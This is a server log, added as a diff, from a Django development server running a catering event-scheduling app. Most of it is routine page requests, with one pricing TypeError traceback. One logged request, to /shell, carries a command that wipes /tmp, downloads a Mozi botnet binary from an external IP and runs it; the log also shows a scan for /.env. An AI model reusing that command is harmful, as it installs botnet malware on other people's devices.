@@ -1,0 +1,188 @@
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+December 24, 2024 - 20:48:32
+Django version 4.2.7, using settings 'system_traiteur.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+
+[24/Dec/2024 20:48:36] "GET /events/1/ HTTP/1.0" 200 5659
+Internal Server Error: /events/add/
+Traceback (most recent call last):
+  File "/root/traiteurhamdouni/venv/lib/python3.12/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/root/traiteurhamdouni/venv/lib/python3.12/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/traiteurhamdouni/events/views.py", line 23, in add_event
+    event.event_cost = event.calculate_total_price()
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/root/traiteurhamdouni/events/models.py", line 73, in calculate_total_price
+    self.price_per_table * self.number_of_tables
+TypeError: unsupported operand type(s) for +: 'decimal.Decimal' and 'NoneType'
+[24/Dec/2024 20:48:46] "POST /events/add/ HTTP/1.0" 500 71807
+Not Found: /favicon.ico
+[24/Dec/2024 20:48:46] "GET /favicon.ico HTTP/1.0" 404 2992
+[24/Dec/2024 20:48:53] "GET / HTTP/1.0" 200 5460
+[24/Dec/2024 20:48:53] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 133
+[24/Dec/2024 20:48:58] "GET /events/ HTTP/1.0" 200 5702
+[24/Dec/2024 20:49:00] "GET /events/add/ HTTP/1.0" 200 12463
+[24/Dec/2024 20:50:25] "POST /events/add/ HTTP/1.0" 302 0
+[24/Dec/2024 20:50:25] "GET /events/ HTTP/1.0" 200 6402
+[24/Dec/2024 20:50:35] "GET / HTTP/1.0" 200 5460
+[24/Dec/2024 20:50:35] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:50:36] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:50:37] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 200
+[24/Dec/2024 20:50:37] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:50:38] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+Forbidden (CSRF token from POST incorrect.): /accounts/login/
+[24/Dec/2024 20:50:41] "POST /accounts/login/ HTTP/1.0" 403 2518
+Forbidden (CSRF token from POST incorrect.): /accounts/login/
+[24/Dec/2024 20:50:49] "POST /accounts/login/ HTTP/1.0" 403 2518
+Forbidden (CSRF cookie not set.): /accounts/login/
+[24/Dec/2024 20:50:55] "POST /accounts/login/ HTTP/1.0" 403 2870
+[24/Dec/2024 20:51:17] "GET / HTTP/1.0" 200 5460
+[24/Dec/2024 20:51:17] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:51:20] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:51:21] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 200
+[24/Dec/2024 20:51:22] "GET /events/3/ HTTP/1.0" 200 5086
+[24/Dec/2024 20:51:24] "GET / HTTP/1.0" 200 5460
+[24/Dec/2024 20:51:24] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:51:27] "GET /events/3/pdf/ HTTP/1.0" 200 4082
+[24/Dec/2024 20:51:56] "GET /assignments/bulk-allocate/3/ HTTP/1.0" 200 4852
+[24/Dec/2024 20:52:08] "GET /events/3/ HTTP/1.0" 200 5086
+[24/Dec/2024 20:52:11] "GET /events/ HTTP/1.0" 200 6402
+[24/Dec/2024 20:52:21] "GET /assignments/assign/?event_id=3 HTTP/1.0" 200 8508
+[24/Dec/2024 20:52:21] "GET /assignments/fetch-availability/?event_id=3 HTTP/1.0" 200 258
+[24/Dec/2024 20:52:31] "POST /assignments/assign/?event_id=3 HTTP/1.0" 302 0
+[24/Dec/2024 20:52:32] "GET /assignments/assign/?event_id=3 HTTP/1.0" 200 8508
+[24/Dec/2024 20:52:32] "GET /assignments/fetch-availability/?event_id=3 HTTP/1.0" 200 265
+[24/Dec/2024 20:52:34] "GET / HTTP/1.0" 200 5460
+[24/Dec/2024 20:52:34] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:52:36] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:52:36] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 200
+[24/Dec/2024 20:52:38] "GET /events/3/ HTTP/1.0" 200 5766
+[24/Dec/2024 20:52:43] "GET /events/3/pdf/ HTTP/1.0" 200 4334
+[24/Dec/2024 20:53:08] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 20:53:08] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 200
+[24/Dec/2024 20:53:10] "GET /events/3/ HTTP/1.0" 200 5653
+[24/Dec/2024 20:53:17] "POST /assignments/unassign/4/ HTTP/1.0" 302 0
+[24/Dec/2024 20:53:17] "GET /events/3/ HTTP/1.0" 200 5230
+[24/Dec/2024 20:53:26] "GET /events/3/pdf/ HTTP/1.0" 200 4082
+[24/Dec/2024 20:57:50] "GET / HTTP/1.0" 200 5460
+[24/Dec/2024 20:57:50] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 22:00:31] "GET / HTTP/1.0" 302 0
+[24/Dec/2024 22:00:31] "GET /accounts/login/ HTTP/1.0" 200 4372
+[24/Dec/2024 22:15:40] "GET /events/add/ HTTP/1.0" 200 12463
+[24/Dec/2024 22:15:44] "GET / HTTP/1.0" 200 5460
+[24/Dec/2024 22:15:45] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 200
+[24/Dec/2024 22:15:47] "GET /events/1/ HTTP/1.0" 200 5765
+[24/Dec/2024 22:15:51] "GET /events/ HTTP/1.0" 200 6402
+[24/Dec/2024 22:15:55] "GET /events/delete/1/ HTTP/1.0" 200 4252
+[24/Dec/2024 22:15:56] "POST /events/delete/1/ HTTP/1.0" 302 0
+[24/Dec/2024 22:15:56] "GET /events/ HTTP/1.0" 200 5695
+[24/Dec/2024 22:15:58] "GET /events/delete/2/ HTTP/1.0" 200 4259
+[24/Dec/2024 22:15:59] "POST /events/delete/2/ HTTP/1.0" 302 0
+[24/Dec/2024 22:15:59] "GET /events/ HTTP/1.0" 200 4993
+[25/Dec/2024 01:34:31] "GET / HTTP/1.0" 302 0
+[25/Dec/2024 01:44:51] "GET / HTTP/1.0" 302 0
+[25/Dec/2024 03:02:00] "GET / HTTP/1.0" 302 0
+Not Found: /.env
+[25/Dec/2024 04:42:48] "GET /.env HTTP/1.1" 404 2975
+[25/Dec/2024 06:43:57] "GET / HTTP/1.0" 302 0
+[25/Dec/2024 06:43:58] "GET /accounts/login/ HTTP/1.0" 200 4372
+Not Found: /shell
+[25/Dec/2024 07:28:23] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://117.254.59.149:35085/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.0" 404 3065
+[25/Dec/2024 08:37:16] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 08:37:16] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 08:37:20] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 08:37:20] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 67
+[25/Dec/2024 08:37:22] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 08:37:22] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:02:33] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 09:02:34] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:03:41] "GET /events/ HTTP/1.0" 200 4993
+[25/Dec/2024 09:03:47] "GET /events/ HTTP/1.0" 200 4993
+[25/Dec/2024 09:03:48] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 09:03:48] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:06:20] "GET /accounts/logout/ HTTP/1.0" 302 0
+[25/Dec/2024 09:06:20] "GET /accounts/login/ HTTP/1.0" 200 4372
+[25/Dec/2024 09:06:27] "POST /accounts/login/ HTTP/1.0" 302 0
+[25/Dec/2024 09:06:28] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 09:06:28] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:06:34] "GET /events/calendar-events/?start=2024-10-27T00%3A00%3A00%2B01%3A00&end=2024-12-08T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:06:35] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:06:35] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:06:36] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 67
+[25/Dec/2024 09:06:38] "GET /events/3/ HTTP/1.0" 200 5086
+[25/Dec/2024 09:06:39] "GET /events/3/pdf/ HTTP/1.0" 200 4082
+[25/Dec/2024 09:14:52] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 09:14:52] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:14:58] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:14:59] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 67
+[25/Dec/2024 09:15:16] "GET /events/3/ HTTP/1.0" 200 5270
+[25/Dec/2024 09:32:12] "GET /events/3/ HTTP/1.0" 200 5086
+[25/Dec/2024 09:32:14] "GET /events/3/pdf/ HTTP/1.0" 200 4082
+[25/Dec/2024 09:33:36] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 09:33:37] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:43:52] "GET /events/calendar-events/?start=2024-12-29T00%3A00%3A00%2B01%3A00&end=2025-02-09T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 09:43:53] "GET /events/calendar-events/?start=2025-01-26T00%3A00%3A00%2B01%3A00&end=2025-03-09T00%3A00%3A00Z HTTP/1.0" 200 67
+[25/Dec/2024 09:43:55] "GET /events/3/ HTTP/1.0" 200 5086
+[25/Dec/2024 09:50:13] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 09:50:13] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 10:04:07] "GET / HTTP/1.0" 302 0
+[25/Dec/2024 12:45:35] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+Not Found: /apple-touch-icon-precomposed.png
+[25/Dec/2024 12:45:39] "GET /apple-touch-icon-precomposed.png HTTP/1.0" 404 3055
+Not Found: /apple-touch-icon.png
+[25/Dec/2024 12:45:39] "GET /apple-touch-icon.png HTTP/1.0" 404 3019
+Not Found: /favicon.ico
+[25/Dec/2024 12:45:39] "GET /favicon.ico HTTP/1.0" 404 2992
+[25/Dec/2024 12:46:57] "GET / HTTP/1.0" 302 0
+[25/Dec/2024 12:46:57] "GET /accounts/login/ HTTP/1.0" 200 4372
+[25/Dec/2024 12:47:17] "POST /accounts/login/ HTTP/1.0" 302 0
+[25/Dec/2024 12:47:17] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 12:47:17] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 12:48:32] "GET /events/ HTTP/1.0" 200 4993
+[25/Dec/2024 12:48:46] "GET /events/3/ HTTP/1.0" 200 5086
+[25/Dec/2024 13:23:26] "GET / HTTP/1.0" 200 5460
+[25/Dec/2024 13:23:26] "GET /events/calendar-events/?start=2024-12-01T00%3A00%3A00%2B01%3A00&end=2025-01-12T00%3A00%3A00%2B01%3A00 HTTP/1.0" 200 67
+[25/Dec/2024 13:24:26] "GET /events/ HTTP/1.0" 200 4993
+[25/Dec/2024 13:24:38] "GET /events/3/ HTTP/1.0" 200 5086
+[25/Dec/2024 13:25:03] "GET /events/3/pdf/ HTTP/1.0" 200 4082
+[25/Dec/2024 13:25:55] "GET /assignments/bulk-allocate/3/ HTTP/1.0" 200 4852
+[25/Dec/2024 13:26:07] "POST /assignments/bulk-allocate/3/ HTTP/1.0" 302 0
+[25/Dec/2024 13:26:07] "GET /events/3/ HTTP/1.0" 200 5199
+[25/Dec/2024 13:26:17] "GET /events/ HTTP/1.0" 200 4993
+[25/Dec/2024 13:27:00] "GET /assignments/assign/?event_id=3 HTTP/1.0" 200 8261
+[25/Dec/2024 13:27:00] "GET /assignments/fetch-availability/?event_id=3 HTTP/1.0" 200 258
+[25/Dec/2024 13:27:14] "POST /assignments/assign/?event_id=3 HTTP/1.0" 302 0
+[25/Dec/2024 13:27:14] "GET /assignments/assign/?event_id=3 HTTP/1.0" 200 8261
+[25/Dec/2024 13:27:14] "GET /assignments/fetch-availability/?event_id=3 HTTP/1.0" 200 265
+[25/Dec/2024 13:27:34] "GET /events/ HTTP/1.0" 200 4993
+[25/Dec/2024 13:27:36] "GET /events/3/ HTTP/1.0" 200 5778
+[25/Dec/2024 13:27:38] "GET /events/3/pdf/ HTTP/1.0" 200 4184
+[25/Dec/2024 14:40:41] "GET / HTTP/1.0" 302 0
+[25/Dec/2024 14:40:41] "GET /accounts/login/ HTTP/1.0" 200 4372
+Not Found: /apple-touch-icon-120x120-precomposed.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.0" 404 3079
+Not Found: /apple-touch-icon-120x120.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon-120x120.png HTTP/1.0" 404 3043
+Not Found: /apple-touch-icon-precomposed.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon-precomposed.png HTTP/1.0" 404 3055
+Not Found: /apple-touch-icon.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon.png HTTP/1.0" 404 3019
+Not Found: /favicon.ico
+[25/Dec/2024 14:40:42] "GET /favicon.ico HTTP/1.0" 404 2992
+Not Found: /apple-touch-icon-120x120-precomposed.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.0" 404 3079
+Not Found: /apple-touch-icon-120x120.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon-120x120.png HTTP/1.0" 404 3043
+Not Found: /apple-touch-icon-precomposed.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon-precomposed.png HTTP/1.0" 404 3055
+Not Found: /apple-touch-icon.png
+[25/Dec/2024 14:40:42] "GET /apple-touch-icon.png HTTP/1.0" 404 3019
+Not Found: /favicon.ico
+[25/Dec/2024 14:40:42] "GET /favicon.ico HTTP/1.0" 404 2992
